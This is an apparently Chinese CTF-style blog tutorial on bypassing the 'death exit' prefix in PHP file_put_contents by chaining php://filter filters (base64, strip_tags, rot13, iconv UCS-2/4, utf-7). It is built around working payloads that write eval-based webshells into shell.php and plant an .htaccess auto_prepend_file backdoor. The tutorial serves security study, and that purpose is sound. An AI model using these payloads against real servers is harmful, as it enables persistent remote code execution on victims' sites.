  <entry>
    <title>file_put_content死亡杂糅</title>
    <link href="/2026/08/14/file_put_content%E6%AD%BB%E4%BA%A1%E6%9D%82%E7%B3%85/"/>
    <url>/2026/08/14/file_put_content%E6%AD%BB%E4%BA%A1%E6%9D%82%E7%B3%85/</url>
    
    <content type="html"><![CDATA[<p>经常出现的三种情形</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br>file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br>file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>xxxxxx&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Bypass-相同变量"><a href="#Bypass-相同变量" class="headerlink" title="Bypass-相同变量"></a>Bypass-相同变量</h2><p>接下来就这个例题我们来做一个简单的研究</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>这道题是最简单的一道死亡绕过，是利用file_put_contents函数写入一道&lt;?php exit();，</p><h3 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h3><p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit; 之类的限制）。</p><p>那么这种情况下，如何绕过这个“死亡exit”？<br>幸运的是，这里的$_POST[‘filename’]是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>总而言之，这就是利用base64编码解码的原理，利用多输出的一个字母’a’将phpexit七个字符被识别为 “phpexita”从而被正常解码 。 而后面我们传入的webshell的base64内容也被正常解码。结果就是没有了。<br>这里我们就有payload<br>以下面payload原型为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">filename=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=1.php</span><br>txt=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>变为</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">filename=<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>0<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>8<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>0<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>3<span class="hljs-variable">%6</span>1<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>9<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%6</span>3<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>2<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>7<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>2<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>9<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>3<span class="hljs-variable">%6</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>3<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%6</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>2<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>2<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>1<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>3<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>3<span class="hljs-variable">%3</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>3<span class="hljs-variable">%3</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>3<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>2<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>3<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%6</span>6<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>2<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>3<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>3<span class="hljs-variable">%6</span>4<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>3<span class="hljs-variable">%3</span>1<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>2<span class="hljs-variable">%6</span>5<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%3</span>0<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>6<span class="hljs-variable">%3</span>8<span class="hljs-variable">%2</span>5<span class="hljs-variable">%3</span>7<span class="hljs-variable">%30</span>  <br>txt=aPD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><p>上面filename的值需要经过URL双重编码得到下面payload，同时txt的值需要将一句话木马base64编码后加上一个字母’a’，但如果题目是phpdie,则需要在前面加两个’a’来满足八个字符的效果</p><h3 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h3><h4 id="strip-tags函数"><a href="#strip-tags函数" class="headerlink" title="strip_tags函数"></a>strip_tags函数</h4><p>我们观察一下，这个实际上是什么？<br>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。<br>所以，我们可以利用 php:&#x2F;&#x2F;filter允许使用多个过滤器的特点，先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除， 而webshell在第二步被还原。<br>那么给到以下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">txt=PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==<br>(<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>)<br>&amp;<br>filename=php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></code></pre></td></tr></table></figure><h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h4><p><strong>利用前提：</strong> PHP不开启short_open_tag（短标签）<br>在字符串过滤器中除了使用string.strip_tagsBypass外,还可以使用string.rot13进行Bypass利用<br>str_rot13() 函数对字符串执行 ROT13 编码。</p><p>ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。<br>编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。<br>原理与前面差不多，直接给到payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">txt=<span class="hljs-meta">&lt;?</span>cuc @<span class="hljs-title function_ invoke__">riny</span>(<span class="hljs-variable">$_CBFG</span>[pzq])<span class="hljs-meta">?&gt;</span><br>（<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd])<span class="hljs-meta">?&gt;</span>）<br>filename=php:<span class="hljs-comment">//filter/write=string.rot13/resource=shell.php</span><br></code></pre></td></tr></table></figure><h3 id="htaccess的预包含利用"><a href="#htaccess的预包含利用" class="headerlink" title=".htaccess的预包含利用"></a>.htaccess的预包含利用</h3><p><strong>局限性</strong>:需要知道flag文件的位置，和文件的名字，string.strip_tags过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误</p><ol><li><strong>第一步</strong>：绕过 die() —— 用 strip_tags 过滤器<br>file_put_contents 实际写入的原始字符串是：<br><code>&lt;?php exit(); + $content内容</code></li></ol><p>当 filename 用了 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags&#x2F;resource&#x3D;.htaccess 时，string.strip_tags 会在写入磁盘前，把整个字符串里所有 HTML&#x2F;XML 标签都删掉。<br>PHP 标签 在 strip_tags 眼里就是一个”标签”，所以变成 php exit();</p><ol start="2"><li><strong>第二步</strong>：写入 .htaccess 指令<br><code>$content=?&gt;php_value auto_prepend_file \1.php</code></li></ol><p>开头的 ?&gt; 是为了闭合 die 前面可能残留的 &lt;?php（完整的XML标签），strip_tags 处理后，最终写入 .htaccess 的内容是：<br><code>php_value auto_prepend_file \1.php</code><br>这是一条合法的 .htaccess 指令，意思是：每次执行任何 PHP 文件之前，自动先加载 \1.php。<br>所以只要 1.php 存在 webshell，访问网站任意 PHP 页面都会触发它。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$filename</span>=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">write</span>=string.strip_tags/resource=.htaccess<br><span class="hljs-variable">$content</span>=?&gt;php_value<span class="hljs-variable">%20auto_prepend</span>_file<span class="hljs-variable">%20</span>\<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><h3 id="最终过滤选择器组合拳"><a href="#最终过滤选择器组合拳" class="headerlink" title="最终过滤选择器组合拳"></a>最终过滤选择器组合拳</h3><p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=shell.php<br>$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0d@eval($_POST[cmd]);?&gt;/resource=shell.php<br></code></pre></td></tr></table></figure><p><img src="https://kivvs.github.io/images/3795925-20260505232316870-1145760888.png"></p><p>注：这里有过尝试但是无法正常上传一句话木马，还有待改进，此方法暂时行不通。同时要用BP上传，否则上传文件名是部分URL编码，用BP上传后能够正常上传文件且文件名正常，但是内容总是乱码，具体原因不得而知。</p><h2 id="Bypass-不同变量"><a href="#Bypass-不同变量" class="headerlink" title="Bypass-不同变量"></a>Bypass-不同变量</h2><p>前面一直都是在相同变量的情况下进行绕过，现在我们再来讨论一下不同变量的是如何绕过的，实际上与前面的原理差不太多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[a];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$a</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析代码可以看到，这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：去除死亡exit写入shell后门。<br>在上面不同变量利用base64构造payload的基础上，可以针对相同变量再次构造相应payload，在文件名中包含，满足正常解码就可以。</p><h3 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=php://filter/write=convert.base64-decode/resource=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php<br><br>//注意payload中的字符&#x27;+&#x27;在浏览器中需要转换为%2B<br><br># &lt;?php @eval($_POST[Qftm])?&gt;<br></code></pre></td></tr></table></figure><p>其实这样构造是不可以的，因为构造的payload里面包含’&#x3D;’符号，而base64解码的时候如果字符’&#x3D;’后面包含有其他字符则会报错。<br>从下图我们也可以看出来</p><p><img src="https://kivvs.github.io/images/3795925-20260505232446777-1997517219.png"></p><p>那么能不能尝试把字符等号去掉，分析payload可以把字符串write&#x3D;去掉减少一个等号，但是字符串resource&#x3D;里面的等号不能去掉，也就导致该payload构造失败。 这里到后面 讲述convert.iconv.*的utf8-utf7的时候会讲述怎么绕过base64解码时字符’&#x3D;’的限制<br>不过这里还有一种去掉等号之直接对内容进行变性另类base64的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../shell.php</span><br>(<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[Qftm])<span class="hljs-meta">?&gt;</span>)<br> <span class="hljs-keyword">string</span>.strip_tags  <br>a=php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php</span><br>(<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[Qftm])<span class="hljs-meta">?&gt;</span>)<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">exit</span>();php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php</span><br></code></pre></td></tr></table></figure><p>这样其实可以利用成功，但是会发现这样的文件访问会有问题,不过利用..&#x2F;重命名即可解决。<br><code>a=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../shell.php</code><br>把?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+作为目录名（不管存不存在），再用..&#x2F;回退一下，这样创建出来的文件名为shell.php，这样创建出来的文件名就正常了<br>不过这种方法有一个缺点就是这种利用手法在windows下利用不成功，因为文件名里面的? &gt;等这些是特殊字符会导致文件的创建失败。</p><h3 id="string-rot13-1"><a href="#string-rot13-1" class="headerlink" title="string.rot13"></a>string.rot13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[pzq])?&gt;/../shell.php<br>(&lt;?php @eval($_POST[cmd])?&gt;)<br></code></pre></td></tr></table></figure><p>针对string.rot13这种Bypass手段，还有另一种方法可以生成正常文件，利用非php:&#x2F;&#x2F;filter参数进行绕过，虽然该方法不存在但是php:&#x2F;&#x2F;filter处理的时候只会显示警告不影响后续的执行<br><code>a=php://filter/write=string.rot13|&lt;?cuc @riny($_CBFG[pzq])?&gt;/resource=shell.php</code><br>这种构造可以使得恶意代码不会存在文件名中，避免了一下文件名因包含特殊字符而出错，当然这种构造在windows下一样可以正常利用。<br><em><strong>convert.iconv.</strong></em><br>对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除，而我们的恶意代码正常解码存储。</p><h3 id="UCS-2编码转换"><a href="#UCS-2编码转换" class="headerlink" title="UCS-2编码转换"></a>UCS-2编码转换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[bash]);?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># ?&lt;hp pe@av(l_$OPTSb[sa]h;)&gt;?</span><br></code></pre></td></tr></table></figure><p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了<br><code>a=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSb[sa]h;)&gt;?/resource=shell.php</code></p><p>组合出的payload：<br><code>&lt;?php exit();php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSb[sa]h;)&gt;?/resource=shell.php</code><br>同样，这里也可以把<strong>UCS-2与rot13组合</strong>起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[bash]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment"># ?&lt;hp pe@av(l_$OPTSb[sa]h;)&gt;?</span><br><span class="hljs-comment"># ?&lt;uc cr@ni(y_$BCGFo[fn]u;)&gt;?</span><br></code></pre></td></tr></table></figure><p>payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$a = &#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|a?&lt;uc cr@ni(y_$BCGFo[fn]u;)&gt;?/resource=shell.php&#x27;; #同样需要补位，这里补了一个a<br># &lt;?php @eval($_POST[bash]);?&gt;<br></code></pre></td></tr></table></figure><h3 id="UCS-4编码转换"><a href="#UCS-4编码转换" class="headerlink" title="UCS-4编码转换"></a>UCS-4编码转换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-4LE&quot;</span>,<span class="hljs-string">&quot;UCS-4BE&quot;</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[bash]);?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># hp?&lt;e@ p(lavOP_$b[TS]hsa&gt;?;)</span><br></code></pre></td></tr></table></figure><p>通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">`a=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$b[TS]hsa&gt;?;)/resource=shell.php`<br><br>&amp;emsp;&amp;emsp;组合出的payload：<br>&lt;?php exit();php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$b[TS]hsa&gt;?;)/resource=shell.php<br></code></pre></td></tr></table></figure><p>当然这种方法（UCS-2&#x2F;4）对于上面讲述的第一种情况前后不同变量也是一样适用的。</p><h3 id="utf8-utf7"><a href="#utf8-utf7" class="headerlink" title="utf8-utf7"></a>utf8-utf7</h3><p>前面介绍单独用base64编码是不可行的（绕不过字符’&#x3D;’的限制），不过这里可以借助组合拳（iconv+base64）进行绕过字符’&#x3D;’在base64解码中的影响。通过iconv将utf-8编码转为utf-7编码，从而把’&#x3D;’给转了，最终也就不会影响到base64的正常解码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">`a=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php`<br>//这里需要注意的是要符合base64解码按照4字节进行的<br>  <br># 正常base64解码部分<br># +ADwphpexit+ADsphp//filter/write+AD0PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+<br># &lt;?php @eval($_POST[Qftm])?&gt;<br></code></pre></td></tr></table></figure><p><strong>参考文档</strong>：<br><a href="https://xz.aliyun.com/news/7758">https://xz.aliyun.com/news/7758</a><br><a href="https://www.cnblogs.com/linuxsec/articles/12684259.html">https://www.cnblogs.com/linuxsec/articles/12684259.html</a><br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>]]></content>
    
    
    
